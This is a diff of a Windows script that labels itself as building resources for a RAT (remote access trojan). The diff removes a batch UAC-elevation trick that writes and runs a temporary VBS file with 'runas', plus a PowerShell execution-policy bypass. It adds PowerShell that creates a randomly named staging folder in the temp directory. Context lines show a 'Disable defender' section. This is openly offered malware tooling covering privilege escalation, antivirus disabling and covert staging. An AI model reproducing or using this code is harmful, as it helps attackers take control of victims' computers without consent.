@@ -1,32 +1,12 @@
-REM get admin permissions for script
-@echo off
-:: BatchGotAdmin
-:-------------------------------------
-REM  --> check for permissions
-    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
->nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
-) ELSE (
->nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
-)
+#build resources for RAT
+# Created by : Luke O'Sullivan
 
-REM --> if error flag set, we do not have admin.
-if '%errorlevel%' NEQ '0' (
-    echo Requesting administrative privileges...
-    goto UACPrompt
-) else ( goto gotAdmin )
+#Random string for directorys
+function random_text{
+    
+    return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
 
-:UACPrompt
-    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
-    set params= %*
-    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"
-
-    "%temp%\getadmin.vbs"
-    del "%temp%\getadmin.vbs"
-    exit /B
-
-:gotAdmin
-    pushd "%CD%"
-    CD /D "%~dp0"
+}
 
 REM Disable defender (May have to be tweeked for Win7)
 
@@ -71,19 +51,6 @@ try {
   Write-Warning "Failed to Disabled Defender"
 }
 
-
-
-
-
-
-
-
-
-}
-
-
-
-
-
-REM Rat resources
-start powershell -ep bypass
+cd $env:temp
+$directory_name = random_text
+mkdir $directory_name
